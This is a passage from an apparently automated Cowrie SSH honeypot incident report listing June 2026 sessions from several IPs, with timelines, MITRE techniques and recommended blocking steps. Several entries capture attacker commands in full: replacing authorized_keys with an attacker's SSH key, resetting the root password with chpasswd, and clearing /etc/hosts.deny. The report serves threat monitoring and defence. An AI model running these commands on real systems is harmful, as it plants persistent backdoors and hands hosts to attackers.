| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:wOKAcJXaVgjT"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 06:39:59` | `cowrie.session.connect` |
| `2026-06-09 06:39:59` | `cowrie.client.version` |
| `2026-06-09 06:39:59` | `cowrie.client.kex` |
| `2026-06-09 06:40:00` | `cowrie.login.success` |
| `2026-06-09 06:40:01` | `cowrie.session.params` |
| `2026-06-09 06:40:01` | `cowrie.command.input` |
| `2026-06-09 06:40:01` | `cowrie.command.failed` |
| `2026-06-09 06:40:01` | `cowrie.log.closed` |
| `2026-06-09 06:40:02` | `cowrie.session.params` |
| `2026-06-09 06:40:02` | `cowrie.command.input` |
| `2026-06-09 06:40:02` | `cowrie.session.file_download` |
| `2026-06-09 06:40:02` | `cowrie.log.closed` |
| `2026-06-09 06:40:20` | `cowrie.session.params` |
| `2026-06-09 06:40:20` | `cowrie.command.input` |
| `2026-06-09 06:40:21` | `cowrie.log.closed` |
| `2026-06-09 06:40:21` | `cowrie.session.params` |
| `2026-06-09 06:40:21` | `cowrie.command.input` |
| `2026-06-09 06:40:22` | `cowrie.log.closed` |
| `2026-06-09 06:40:22` | `cowrie.session.params` |
| `2026-06-09 06:40:22` | `cowrie.command.input` |
| `2026-06-09 06:40:22` | `cowrie.session.file_download` |
| `2026-06-09 06:40:22` | `cowrie.log.closed` |
| `2026-06-09 06:40:23` | `cowrie.session.params` |
| `2026-06-09 06:40:23` | `cowrie.command.input` |
| `2026-06-09 06:40:24` | `cowrie.log.closed` |
| `2026-06-09 06:40:24` | `cowrie.session.params` |
| `2026-06-09 06:40:24` | `cowrie.command.input` |
| `2026-06-09 06:40:25` | `cowrie.log.closed` |
| `2026-06-09 06:40:26` | `cowrie.session.params` |
| `2026-06-09 06:40:26` | `cowrie.command.input` |
| `2026-06-09 06:40:26` | `cowrie.command.input` |
| `2026-06-09 06:40:26` | `cowrie.log.closed` |
| `2026-06-09 06:40:27` | `cowrie.session.params` |
| `2026-06-09 06:40:27` | `cowrie.command.input` |
| `2026-06-09 06:40:28` | `cowrie.log.closed` |
| `2026-06-09 06:40:28` | `cowrie.session.params` |
| `2026-06-09 06:40:28` | `cowrie.command.input` |
| `2026-06-09 06:40:29` | `cowrie.log.closed` |
| `2026-06-09 06:40:29` | `cowrie.session.params` |
| `2026-06-09 06:40:29` | `cowrie.command.input` |
| `2026-06-09 06:40:31` | `cowrie.log.closed` |
| `2026-06-09 06:40:31` | `cowrie.session.params` |
| `2026-06-09 06:40:31` | `cowrie.command.input` |
| `2026-06-09 06:40:32` | `cowrie.log.closed` |
| `2026-06-09 06:40:32` | `cowrie.session.params` |
| `2026-06-09 06:40:32` | `cowrie.command.input` |
| `2026-06-09 06:40:32` | `cowrie.log.closed` |
| `2026-06-09 06:40:33` | `cowrie.session.params` |
| `2026-06-09 06:40:33` | `cowrie.command.input` |
| `2026-06-09 06:40:33` | `cowrie.log.closed` |
| `2026-06-09 06:40:34` | `cowrie.session.params` |
| `2026-06-09 06:40:34` | `cowrie.command.input` |
| `2026-06-09 06:40:34` | `cowrie.log.closed` |
| `2026-06-09 06:40:35` | `cowrie.session.params` |
| `2026-06-09 06:40:35` | `cowrie.command.input` |
| `2026-06-09 06:40:35` | `cowrie.log.closed` |
| `2026-06-09 06:40:35` | `cowrie.session.params` |
| `2026-06-09 06:40:35` | `cowrie.command.input` |
| `2026-06-09 06:40:36` | `cowrie.log.closed` |
| `2026-06-09 06:40:37` | `cowrie.session.params` |
| `2026-06-09 06:40:37` | `cowrie.command.input` |
| `2026-06-09 06:40:37` | `cowrie.log.closed` |
| `2026-06-09 06:40:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.80.226[.]34` to AbuseIPDB if not already reported
- [ ] Block `117.80.226[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd003db049b4

| Field | Detail |
|---|---|
| **Source IP** | `103.38.219[.]22` |
| **First Seen** | 2026-06-09 06:41 |
| **Last Seen** | 2026-06-09 06:41 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 06:41:18` | `cowrie.session.connect` |
| `2026-06-09 06:41:18` | `cowrie.client.version` |
| `2026-06-09 06:41:18` | `cowrie.client.kex` |
| `2026-06-09 06:41:18` | `cowrie.login.success` |
| `2026-06-09 06:41:18` | `cowrie.session.params` |
| `2026-06-09 06:41:18` | `cowrie.command.input` |
| `2026-06-09 06:41:18` | `cowrie.command.failed` |
| `2026-06-09 06:41:19` | `cowrie.log.closed` |
| `2026-06-09 06:41:19` | `cowrie.session.params` |
| `2026-06-09 06:41:19` | `cowrie.command.input` |
| `2026-06-09 06:41:19` | `cowrie.session.file_download` |
| `2026-06-09 06:41:19` | `cowrie.log.closed` |
| `2026-06-09 06:41:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.38.219[.]22` to AbuseIPDB if not already reported
- [ ] Block `103.38.219[.]22` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-728543ba7eb5

| Field | Detail |
|---|---|
| **Source IP** | `103.38.219[.]22` |
| **First Seen** | 2026-06-09 06:41 |
| **Last Seen** | 2026-06-09 06:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 06:41:20` | `cowrie.session.connect` |
| `2026-06-09 06:41:20` | `cowrie.client.version` |
| `2026-06-09 06:41:20` | `cowrie.client.kex` |
| `2026-06-09 06:41:20` | `cowrie.login.success` |
| `2026-06-09 06:41:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.38.219[.]22` to AbuseIPDB if not already reported
- [ ] Block `103.38.219[.]22` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44f12d2f36fd

| Field | Detail |
|---|---|
| **Source IP** | `31.56.178[.]132` |
| **First Seen** | 2026-06-09 06:41 |
| **Last Seen** | 2026-06-09 06:41 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 06:41:33` | `cowrie.session.connect` |
| `2026-06-09 06:41:33` | `cowrie.client.version` |
| `2026-06-09 06:41:33` | `cowrie.client.kex` |
| `2026-06-09 06:41:34` | `cowrie.login.success` |
| `2026-06-09 06:41:35` | `cowrie.session.params` |
| `2026-06-09 06:41:35` | `cowrie.command.input` |
| `2026-06-09 06:41:35` | `cowrie.command.failed` |
| `2026-06-09 06:41:35` | `cowrie.log.closed` |
| `2026-06-09 06:41:35` | `cowrie.session.params` |
| `2026-06-09 06:41:35` | `cowrie.command.input` |
| `2026-06-09 06:41:36` | `cowrie.session.file_download` |
| `2026-06-09 06:41:36` | `cowrie.log.closed` |
| `2026-06-09 06:41:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.56.178[.]132` to AbuseIPDB if not already reported
- [ ] Block `31.56.178[.]132` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9bebca48d1c0

| Field | Detail |
|---|---|
| **Source IP** | `31.56.178[.]132` |
| **First Seen** | 2026-06-09 06:41 |
| **Last Seen** | 2026-06-09 06:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 06:41:39` | `cowrie.session.connect` |
| `2026-06-09 06:41:39` | `cowrie.client.version` |
| `2026-06-09 06:41:39` | `cowrie.client.kex` |
| `2026-06-09 06:41:40` | `cowrie.login.success` |
| `2026-06-09 06:41:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.56.178[.]132` to AbuseIPDB if not already reported
- [ ] Block `31.56.178[.]132` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4efa755c28ec

| Field | Detail |
|---|---|
| **Source IP** | `173.249.0[.]223` |
| **First Seen** | 2026-06-09 06:44 |
| **Last Seen** | 2026-06-09 06:44 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 06:44:25` | `cowrie.session.connect` |
| `2026-06-09 06:44:25` | `cowrie.client.version` |
| `2026-06-09 06:44:25` | `cowrie.client.kex` |
| `2026-06-09 06:44:26` | `cowrie.login.success` |
| `2026-06-09 06:44:26` | `cowrie.session.params` |
| `2026-06-09 06:44:26` | `cowrie.command.input` |
| `2026-06-09 06:44:26` | `cowrie.command.failed` |
| `2026-06-09 06:44:26` | `cowrie.log.closed` |
| `2026-06-09 06:44:26` | `cowrie.session.params` |
| `2026-06-09 06:44:26` | `cowrie.command.input` |
| `2026-06-09 06:44:27` | `cowrie.session.file_download` |
| `2026-06-09 06:44:27` | `cowrie.log.closed` |
| `2026-06-09 06:44:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `173.249.0[.]223` to AbuseIPDB if not already reported
- [ ] Block `173.249.0[.]223` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e01a45a70699

| Field | Detail |
|---|---|
| **Source IP** | `173.249.0[.]223` |
| **First Seen** | 2026-06-09 06:44 |
| **Last Seen** | 2026-06-09 06:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 06:44:29` | `cowrie.session.connect` |
| `2026-06-09 06:44:29` | `cowrie.client.version` |
| `2026-06-09 06:44:29` | `cowrie.client.kex` |
| `2026-06-09 06:44:29` | `cowrie.login.success` |
| `2026-06-09 06:44:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `173.249.0[.]223` to AbuseIPDB if not already reported
- [ ] Block `173.249.0[.]223` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32fe325f097e

| Field | Detail |
|---|---|
| **Source IP** | `103.38.219[.]22` |
| **First Seen** | 2026-06-09 06:45 |
| **Last Seen** | 2026-06-09 06:45 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 06:45:18` | `cowrie.session.connect` |
| `2026-06-09 06:45:18` | `cowrie.client.version` |
| `2026-06-09 06:45:18` | `cowrie.client.kex` |
| `2026-06-09 06:45:19` | `cowrie.login.success` |
| `2026-06-09 06:45:19` | `cowrie.session.params` |
| `2026-06-09 06:45:19` | `cowrie.command.input` |
| `2026-06-09 06:45:19` | `cowrie.command.failed` |
| `2026-06-09 06:45:19` | `cowrie.log.closed` |
| `2026-06-09 06:45:19` | `cowrie.session.params` |
| `2026-06-09 06:45:19` | `cowrie.command.input` |
| `2026-06-09 06:45:19` | `cowrie.session.file_download` |
| `2026-06-09 06:45:19` | `cowrie.log.closed` |
| `2026-06-09 06:45:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.38.219[.]22` to AbuseIPDB if not already reported
- [ ] Block `103.38.219[.]22` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6c4ce2f0257

| Field | Detail |
|---|---|
| **Source IP** | `103.38.219[.]22` |
| **First Seen** | 2026-06-09 06:45 |
| **Last Seen** | 2026-06-09 06:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 06:45:20` | `cowrie.session.connect` |
| `2026-06-09 06:45:20` | `cowrie.client.version` |
| `2026-06-09 06:45:20` | `cowrie.client.kex` |
| `2026-06-09 06:45:20` | `cowrie.login.success` |
| `2026-06-09 06:45:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.38.219[.]22` to AbuseIPDB if not already reported
- [ ] Block `103.38.219[.]22` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a38c93f480d

| Field | Detail |
|---|---|
| **Source IP** | `182.44.38[.]181` |
| **First Seen** | 2026-06-09 06:48 |
| **Last Seen** | 2026-06-09 06:48 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 06:48:40` | `cowrie.session.connect` |
| `2026-06-09 06:48:41` | `cowrie.client.version` |
| `2026-06-09 06:48:41` | `cowrie.client.kex` |
| `2026-06-09 06:48:41` | `cowrie.login.success` |
| `2026-06-09 06:48:42` | `cowrie.session.params` |
| `2026-06-09 06:48:42` | `cowrie.command.input` |
| `2026-06-09 06:48:42` | `cowrie.command.failed` |
| `2026-06-09 06:48:42` | `cowrie.log.closed` |
| `2026-06-09 06:48:42` | `cowrie.session.params` |
| `2026-06-09 06:48:42` | `cowrie.command.input` |
| `2026-06-09 06:48:42` | `cowrie.session.file_download` |
| `2026-06-09 06:48:42` | `cowrie.log.closed` |
| `2026-06-09 06:48:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.44.38[.]181` to AbuseIPDB if not already reported
- [ ] Block `182.44.38[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c033c285d8e6

| Field | Detail |
|---|---|
| **Source IP** | `182.44.38[.]181` |
| **First Seen** | 2026-06-09 06:48 |
| **Last Seen** | 2026-06-09 06:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 06:48:56` | `cowrie.session.connect` |
| `2026-06-09 06:48:57` | `cowrie.client.version` |
| `2026-06-09 06:48:57` | `cowrie.client.kex` |
| `2026-06-09 06:48:57` | `cowrie.login.success` |
| `2026-06-09 06:48:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.44.38[.]181` to AbuseIPDB if not already reported
- [ ] Block `182.44.38[.]181` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f25ab4b57770

| Field | Detail |
|---|---|
| **Source IP** | `38.148.249[.]2` |
| **First Seen** | 2026-06-09 07:06 |
| **Last Seen** | 2026-06-09 07:06 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 07:06:07` | `cowrie.session.connect` |
| `2026-06-09 07:06:07` | `cowrie.client.version` |
| `2026-06-09 07:06:08` | `cowrie.client.kex` |
| `2026-06-09 07:06:09` | `cowrie.login.success` |
| `2026-06-09 07:06:09` | `cowrie.session.params` |
| `2026-06-09 07:06:09` | `cowrie.command.input` |
| `2026-06-09 07:06:09` | `cowrie.command.failed` |
| `2026-06-09 07:06:10` | `cowrie.log.closed` |
| `2026-06-09 07:06:10` | `cowrie.session.params` |
| `2026-06-09 07:06:10` | `cowrie.command.input` |
| `2026-06-09 07:06:10` | `cowrie.session.file_download` |
| `2026-06-09 07:06:10` | `cowrie.log.closed` |
| `2026-06-09 07:06:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.148.249[.]2` to AbuseIPDB if not already reported
- [ ] Block `38.148.249[.]2` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13d464920fbd

| Field | Detail |
|---|---|
| **Source IP** | `38.148.249[.]2` |
| **First Seen** | 2026-06-09 07:06 |
| **Last Seen** | 2026-06-09 07:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 07:06:13` | `cowrie.session.connect` |
| `2026-06-09 07:06:13` | `cowrie.client.version` |
| `2026-06-09 07:06:13` | `cowrie.client.kex` |
| `2026-06-09 07:06:14` | `cowrie.login.success` |
| `2026-06-09 07:06:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.148.249[.]2` to AbuseIPDB if not already reported
- [ ] Block `38.148.249[.]2` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95af199e4eb2

| Field | Detail |
|---|---|
| **Source IP** | `14.103.118[.]177` |
| **First Seen** | 2026-06-09 07:07 |
| **Last Seen** | 2026-06-09 07:08 |
| **Session Duration** | 27s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:C7uexs5gOt2o"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 07:07:54` | `cowrie.session.connect` |
| `2026-06-09 07:07:54` | `cowrie.client.version` |
| `2026-06-09 07:07:55` | `cowrie.client.kex` |
| `2026-06-09 07:07:55` | `cowrie.login.success` |
| `2026-06-09 07:07:56` | `cowrie.session.params` |
| `2026-06-09 07:07:56` | `cowrie.command.input` |
| `2026-06-09 07:07:56` | `cowrie.command.failed` |
| `2026-06-09 07:07:56` | `cowrie.log.closed` |
| `2026-06-09 07:07:56` | `cowrie.session.params` |
| `2026-06-09 07:07:56` | `cowrie.command.input` |
| `2026-06-09 07:07:56` | `cowrie.session.file_download` |
| `2026-06-09 07:07:56` | `cowrie.log.closed` |
| `2026-06-09 07:08:13` | `cowrie.session.params` |
| `2026-06-09 07:08:13` | `cowrie.command.input` |
| `2026-06-09 07:08:13` | `cowrie.log.closed` |
| `2026-06-09 07:08:13` | `cowrie.session.params` |
| `2026-06-09 07:08:13` | `cowrie.command.input` |
